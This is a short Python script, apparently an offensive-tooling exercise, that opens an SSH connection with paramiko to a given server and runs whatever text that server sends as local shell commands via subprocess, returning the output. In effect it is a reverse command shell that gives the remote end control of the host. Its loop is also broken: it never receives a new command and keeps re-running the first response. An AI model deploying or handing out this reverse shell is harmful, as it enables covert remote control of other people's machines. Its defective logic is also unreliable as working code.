import paramiko
import shlex
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        response = ssh_session.recv(1024)
        print(response.decode())
        while True:
            command = response
            try:
                cmd = command.decode()
                if cmd == 'exit':
                    client.close()
                    break
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)
                ssh_session.send(cmd_output or 'Okay')
            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return

if __name__ == '__main__':
    import getpass
    user = input('Enter username: ') or 'tim'
    password = getpass.getpass()

    ip = input('Enter server IP: ') or '127.0.0.1'
    port = input('Enter port: ') or 2222
    ssh_command(ip, port, user, password, 'ClientConnected')
